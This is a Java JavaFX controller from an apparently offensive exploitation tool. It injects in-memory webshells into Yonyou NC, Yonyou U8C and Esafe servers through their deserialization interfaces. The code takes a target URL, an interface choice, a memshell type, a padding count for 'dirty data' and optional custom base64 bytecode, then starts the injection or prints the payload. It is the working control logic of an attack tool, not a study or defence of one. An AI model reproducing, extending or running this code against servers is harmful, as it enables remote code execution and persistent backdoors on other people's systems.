package controller;

import Memshell.AllMemshell;
import Memshell.AllesnInterface;
import Memshell.AllyyncInterface;
import Memshell.Allyyu8cInterface;
import cn.hutool.core.util.StrUtil;
import core.MemShellInterface;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.input.MouseEvent;
import utils.Kinds_Mem;

import java.util.HashMap;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MemshellController {

    private final Kinds_Mem mem = new Kinds_Mem();//初始化mem相关数据

    private final ExecutorService service = Executors.newCachedThreadPool();
    private final CompletionService<HashMap<String, Object>> completionService = new ExecutorCompletionService<>(
            service);
    @FXML
    public TextField className;
    @FXML
    public TextField dirtyNum;
    @FXML
    public Button getStr;
    private boolean initialized = false;
    @FXML
    private ListView<String> listview_interface;
    @FXML
    private ListView<String> listview_printType;
    @FXML
    private TextField memshell_url;
    @FXML
    private TextArea classbyte;

    @FXML
    private Button inject_mem;
    @FXML
    private TextArea textArea_memshell;
    @FXML
    private ChoiceBox<String> OAType;

    @FXML
    private ChoiceBox<String> injectType;

    @FXML
    void Inj_clicked(MouseEvent event) {
        //初始清空
        Platform.runLater(() -> {
            textArea_memshell.clear();
        });
        //获取url地址
        String url;
        if (StrUtil.isBlank(memshell_url.getText())) {
            Platform.runLater(() -> {
                textArea_memshell.appendText("\n");
                textArea_memshell.appendText("请填写URL：");
            });
            return;
        }
        if (memshell_url.getText().trim().endsWith("/")) {
            url = memshell_url.getText().trim()
                    .substring(0, memshell_url.getText().trim().length() - 1);
        } else {
            url = memshell_url.getText().trim();
        }

        int dirtyN ;
        if (StrUtil.isBlank(dirtyNum.getText())) {
            dirtyN = 100;
        }else{
            try {
                dirtyN = Integer.parseInt(dirtyNum.getText().trim());
            }catch (Exception e){
                dirtyN = 100;
            }
        }
        //获取需要利用的mem


        String oatype = OAType.getValue();
        String memtype = injectType.getValue();

        String lv_interface = listview_interface.getSelectionModel().getSelectedItem();
        String interF = getInterF(oatype,lv_interface);
        if (StrUtil.isBlank(lv_interface)) {
            Platform.runLater(() -> {
                textArea_memshell.appendText("\n");
                textArea_memshell.appendText("请选择反序列化接口类型");
            });
            return;
        }

        MemShellInterface memShell = Kinds_Mem.getMemShell(oatype,memtype);
        String[] array = new String[4];
        if (memtype == null ) {

            Platform.runLater(() -> {
                textArea_memshell.appendText("\n");
                textArea_memshell.appendText("请选择内存马类型注入");
            });
            return;

        }else if (memtype.contains("define")) {
            if(StrUtil.isBlank(className.getText().trim()) || StrUtil.isBlank(classbyte.getText().trim())){
                Platform.runLater(() -> {
                    textArea_memshell.appendText("\n");
                    textArea_memshell.appendText("请输入注入类名及base64字节码");
                });
                return;
            }else{
                try {
                    array[0] = classbyte.getText().trim();
                    array[1] = className.getText().trim();
                    array[2] = "define";
                    array[3] = "define";
                    Boolean Injectdefine = memShell.inject(url, interF, memtype, dirtyN, array, textArea_memshell);
                    if (Injectdefine) {
                        return;
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }

        }else {
            array = AllMemshell.getMeminfo(memtype,oatype);
            Boolean InjectMem= memShell.inject(url,interF,memtype,dirtyN,array,textArea_memshell);
            if (InjectMem) {

                return;
            }
        }
        return;
    }

    @FXML
    public void get_clicked(MouseEvent mouseEvent) {
        //初始清空
        Platform.runLater(() -> {
            textArea_memshell.clear();
        });

        if (StrUtil.isBlank(dirtyNum.getText())) {

        }

        int dirtyN ;
        if (StrUtil.isBlank(dirtyNum.getText())) {
            dirtyN = 100;
        }else{
            try {
                dirtyN = Integer.parseInt(dirtyNum.getText().trim());
            }catch (Exception e){
                dirtyN = 100;
            }
        }
        //获取需要利用的mem


        String oatype = OAType.getValue();
        String memtype = injectType.getValue();
        String lv_interface = listview_interface.getSelectionModel().getSelectedItem();
        if (StrUtil.isBlank(lv_interface)) {
            Platform.runLater(() -> {
                textArea_memshell.appendText("\n");
                textArea_memshell.appendText("请选择反序列化接口类型");
            });
            return;
        }
        String lv_PrintType = listview_printType.getSelectionModel().getSelectedItem();
        if (StrUtil.isBlank(lv_PrintType)) {
            Platform.runLater(() -> {
                textArea_memshell.appendText("\n");
                textArea_memshell.appendText("请选择输出格式类型");
            });
            return;
        }
        MemShellInterface memShell = Kinds_Mem.getMemShell(oatype,memtype);
        String[] array = new String[2];
        if (memtype == null ) {

            Platform.runLater(() -> {
                textArea_memshell.appendText("\n");
                textArea_memshell.appendText("请选择内存马类型注入");
            });
            return;

        }else if (memtype.contains("define")) {
            if(StrUtil.isBlank(className.getText().trim()) || StrUtil.isBlank(classbyte.getText().trim())){
                Platform.runLater(() -> {
                    textArea_memshell.appendText("\n");
                    textArea_memshell.appendText("请输入注入类名及base64字节码");
                });
                return;
            }else{
                try {
                    array[0] = classbyte.getText().trim();
                    array[1] = className.getText().trim();
                    Boolean Injectdefine = memShell.injectPrint(memtype,lv_interface, lv_PrintType, dirtyN, array, textArea_memshell);
                    if (Injectdefine) {
                        return;
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }

        }else {
            array = AllMemshell.getMeminfo(memtype,oatype);
            Boolean InjectMem= memShell.injectPrint(memtype,lv_interface, lv_PrintType, dirtyN, array, textArea_memshell);
            if (InjectMem) {

                return;
            }
        }
        return;
    }

    @FXML
    public void initialize() {

        //设置自动换行
        classbyte.setWrapText(true);
        textArea_memshell.setWrapText(true);

        //适配屏幕
        System.setProperty("prism.allowhidpi", "true");

        //渲染Tab1 左上 下拉选
        //设置初始化数据
        OAType.setItems(mem.getFXKindList());
        //设置默认选项
        OAType.setValue(mem.getKindList().get(0));
        //选项绑定监听器，当左上 下拉选 数据发生改变，更新列表数据，同时更新mem下拉选数据
        OAType.getSelectionModel().selectedItemProperty()
                .addListener((observable, oldValue, newValue) ->
                    buildChoiceBoxListener(newValue)
                );

        listview_printType.setItems(mem.pri());

        // 第一次渲染该页面时渲染数据
        if (!initialized) {
            //更新列表数据
            buildChoiceBoxListener(mem.getKindList().get(0));
            initialized = true;
        }

    }

    private void buildChoiceBoxListener(String newValue) {
        switch (newValue) {
            case "用友NC":
                listview_interface.setItems(Kinds_Mem.yonyouNc());
                break;
            case "用友U8C":
                listview_interface.setItems(Kinds_Mem.yonyouU8C());
                break;
            case "亿赛通":
                listview_interface.setItems(Kinds_Mem.esafe());
                break;
        }
        updateListView(listview_interface.getItems().get(1),newValue);
    }

    private static String getInterF(String oatype,String lv_interface){
        String interF = "";
        if(oatype.contains("用友NC")){
            interF = AllyyncInterface.getInterFace(lv_interface);
        }else if(oatype.contains("亿赛通")){
            interF = AllesnInterface.getInterFace(lv_interface);
        }else if(oatype.contains("用友U8C")){
            interF = Allyyu8cInterface.getInterFace(lv_interface);
        }
        return interF;
    }


    @FXML
    void listview_clicked() {
        String selectedItem = listview_interface.getSelectionModel().getSelectedItem();
        String oatype = OAType.getValue();
        updateListView(selectedItem,oatype);
    }

    private void updateListView(String selectedItem,String type) {
        if(type.contains("用友NC")) {
            switch (selectedItem) {
                case "ActionHandlerServlet反序列化":
                    injectType.setItems(mem.Mem());
                    break;
                default:
                    // 当所选项还没有mem给默认选项
                    injectType.setItems(mem.Mem());
            }
        }else if(type.contains("亿赛通")){
            injectType.setItems(mem.Mem());
        }else if(type.contains("用友U8C")){
            injectType.setItems(mem.Mem());
        }
        injectType.setValue(mem.getMemList().get(0));
    }


    @FXML
    void print_clicked() {
        listview_printType.setItems(mem.pri());
    }



}
